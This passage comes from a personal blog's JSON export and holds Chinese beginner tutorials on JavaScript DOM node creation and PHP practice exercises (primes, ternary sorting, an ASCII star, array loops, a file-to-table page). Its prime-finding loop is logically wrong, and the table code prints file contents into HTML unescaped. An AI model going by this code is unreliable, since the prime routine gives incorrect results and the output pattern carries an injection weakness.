onclick=\"myFunction()\"&gt;点我&lt;/button&gt; 是一个按钮标签。 一般来说这里我们都是些一个id去指定这个按钮。但是这里没有，当我们点击按钮后，这里直接通过onclick事件跳转了。他跳到了onclick=”myFunction()”后面的myFunction()函数处。 在函数中出现了另一个事件。通过引用”demo”这个标签，在ta的html范围内输出“Hello World”。从而这段代码的意思就是当我们点击按钮后在demo的代码范围内输出Hello World。 四.创建节点下面的js代码是单击按钮将项目添加到列表中。 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;ul id=\"myList\"&gt;&lt;li&gt;Coffee&lt;/li&gt;&lt;li&gt;Tea&lt;/li&gt;&lt;/ul&gt;&lt;p id=\"demo\"&gt;单击按钮将项目添加到列表中&lt;/p&gt;&lt;button onclick=\"myFunction()\"&gt;点我&lt;/button&gt;&lt;script&gt;function myFunction()&#123; var node=document.createElement(\"LI\"); var textnode=document.createTextNode(\"Water\"); node.appendChild(textnode); document.getElementById(\"myList\").appendChild(node);&#125;&lt;/script&gt;&lt;p&gt;&lt;strong&gt;注意:&lt;/strong&gt;&lt;br&gt;首先创建一个节点，&lt;br&gt; 然后创建一个文本节点，&lt;br&gt;然后将文本节点添加到LI节点上。&lt;br&gt;最后将节点添加到列表中。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 每点击一次“点我”，就在列表中增加一个值。 上面的代码执行顺序如下： 首先创建一个Li节点，然后创建一个文本节点，然后将文本节点增加到LI节点上。最后将节点增加到列表中。 createElement就是创建一个节点，createTextNode就是创建一个文本节点，appendChild就是将textnode（创建文本节点）加入到node(创建的节点)中去。 最后引用”myList” id，appendChild(node)将node(节点和文本节点的结合体)加入到标签中去。 五.createElement AND createTextNode继上一个onclick事件之后扩展出另外一个程序。如下： 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p id=\"demo\"&gt;单击按钮创建一个标题&lt;/p&gt;&lt;button onclick=\"myFunction()\"&gt;点我&lt;/button&gt;&lt;script&gt;function myFunction()&#123; var h=document.createElement(\"H1\"); var t=document.createTextNode(\"Hello World\"); h.appendChild(t); document.body.appendChild(h);&#125;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里出现了新的事件createElement()，createTextNode()。 createrElement()的作用是创建一个”H1”节点（字体大小），然后createTextNode(“Hello World”)创建一个对象。h.appendChild(t)将t”Hello World”加入加入“H1”中(字体也会相应的变最大)。最后将h对象加入body的最后面。","categories":[],"tags":[]},{"title":"PHP代码练习","slug":"PHP代码练习","date":"2019-08-07T09:06:28.000Z","updated":"2019-08-13T14:16:39.273Z","comments":true,"path":"2019/08/07/PHP代码练习/","link":"","permalink":"https://0xxk.github.io/2019/08/07/PHP代码练习/","excerpt":"这个","text":"这个 素数查找12345678910111213// 素数:只能被1和自身整除for($i=1;$i&lt;100;$i++)&#123; for($j=1;$j&lt;$i;$j++) &#123; if(($i%$j)==0) &#123; $i++; continue; //不是继续查找 &#125; &#125; echo $i.&quot;\\n&quot;;&#125; 三元排大小123456789101112131415161718192021222324252627282930echo &quot;&lt;br&gt;&quot;;($a==$b&amp;&amp;$b==$c)?( print &quot;$a=$b=$c&quot;):( ($a==$b)?( ($a&gt;$c)?( print &quot;$a=$b&gt;$c&quot; ):( print &quot;$c&gt;$a=$b&quot; ) ):( ($a==$c)?( ($a&gt;$b)?( print &quot;$a=$c&gt;$b&quot; ):( print &quot;$b&gt;$a=$c&quot; ) ):( ($b==$c)?( ($a&gt;$b)?( print &quot;$a&gt;$b=$c&quot; ):( print &quot;$b=$c&gt;$a&quot; ) ):( ($a&gt;$b)? (($a&gt;$c)? (($c&gt;$b)? (print &quot;$a&gt;$c&gt;$b&quot;):(print &quot;$a&gt;$b&gt;$c&quot;)):(print &quot;$c&gt;$a&gt;$b&quot;)):(($b&gt;$c)? (($a&gt;$c)? (print &quot;$b&gt;$a&gt;$c&quot;):(print &quot;$b&gt;$c&gt;$a&quot;)):(print &quot;$c&gt;$b&gt;$a&quot;)) ) ) )); 五角星123456789101112131415161718192021222324252627282930313233343536for($i1=1;$i1&lt;7;$i1++) /*这是五角星的上面一个角*/ &#123; for($j1=1;$j1&lt;19-$i1;$j1++) /*这是空格*/ printf(&quot; &quot;); for($k1=1;$k1&lt;=2*$i1-1;$k1++) /*这是“*”*/ printf(&quot;*&quot;); printf(&quot;\\n&quot;); &#125; for($i2=1;$i2&lt;5;$i2++) /*这是五角星的中间两个角*/ &#123; for($j2=1;$j2&lt;3*$i2-3;$j2++) printf(&quot; &quot;); for($k2=1;$k2&lt;=42-6*$i2;$k2++) printf(&quot;*&quot;); printf(&quot;\\n&quot;); &#125; for($i3=1;$i3&lt;3;$i3++) //这是中间与下部相接的部分 &#123; for($j3=1;$j3&lt;12-$i3;$j3++) printf(&quot; &quot;); for($k3=1;$k3&lt;=12+2*$i3;$k3++) printf(&quot;*&quot;); printf(&quot;\\n&quot;); &#125; for($i4=1;$i4&lt;5;$i4++) // 这是五角星的下面两个角 &#123; for($j4=1;$j4&lt;10-$i4;$j4++) printf(&quot; &quot;); for($k4=1;$k4&lt;=10-2*$i4;$k4++) printf(&quot;*&quot;); for($m4=1;$m4&lt;6*$i4-3;$m4++) printf(&quot; &quot;); for($n4=1;$n4&lt;=10-2*$i4;$n4++) printf(&quot;*&quot;); printf(&quot;\\n&quot;); &#125; for循环实现关联数组的遍历1234567$arr=[&apos;q&apos;=&gt;&apos;12&apos;,&apos;w&apos;=&gt;&apos;13&apos;,&apos;e&apos;=&gt;&apos;14&apos;,&apos;r&apos;=&gt;&quot;15&quot;];$num=count($arr);for($i=0;$i&lt;$num;$i++)&#123; echo key($arr).&quot;=&gt;&quot;.current($arr).&quot;\\n&quot;; next($arr);&#125; 通过文件读写对HTML表格的操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; &gt; &lt;title&gt;news&lt;/title&gt;&lt;/head&gt;&lt;body background=&quot;img/2.jpg&quot;&gt;&lt;table border=&quot;1&quot; width=&quot;100%&quot; cellspacing=&quot;10&quot; cellpadding=&quot;10&quot; align=&quot;center &quot; bgcolor=&quot;#6495ed&quot;&gt; &lt;tr&gt; &lt;th id=&quot;pm&quot;&gt;排名&lt;/th&gt; &lt;th id=&quot;mz&quot;&gt;名字&lt;/th&gt; &lt;th id=&quot;jj&quot; bgcolor=&quot;#a52a2a&quot;&gt;简介&lt;/th&gt; &lt;th id=&quot;ss&quot;&gt;搜索指数&lt;/th&gt; &lt;/tr&gt; &lt;?php // 打开数据文件 $file=fopen(&quot;/Project/PHP/news/data/new.db&quot;,&quot;r&quot;); if($file==null) &#123; echo &quot;文件打开失败&quot;; die(); &#125; $str=fgets($file); // 去掉表格标题 $i=0; while(!feof($file)) &#123; $str=fgets($file); $data=explode(&apos;||&apos;,$str);// 获取字符串按 || 分割成数组 if($i&lt;3) &#123; // 前三行调用图片和简介 table_qiansan($data); &#125; else&#123; table_fun($data);// 调用自定义函数 &#125; $i++; &#125; fclose($file); ?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php// 三行前的信息读取// 分别显示 id 图片 简介function table_qiansan($data)&#123; $data[2]=substr( $data[2],0,200); echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;$data[0]&lt;/td&gt; &lt;td&gt;&lt;img src=&quot;img/1.jpg&quot;&gt;&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;$data[2]&lt;/td&gt; &lt;/tr&gt;EOF;&#125;// 三行后的信息function table_fun($data)&#123; echo &lt;&lt;&lt;EOF &lt;tr&gt; &lt;td&gt;$data[0]&lt;/td&gt; &lt;td&gt;$data[1]&lt;/td&gt; &lt;td&gt;$data[2]&lt;/td&gt; &lt;td&gt;$data[3]&lt;/td&gt; &lt;/tr&gt;;EOF;&#125;?&gt; 效果图","categories":[],"tags":[],"author":"Evolyutsiya"}]}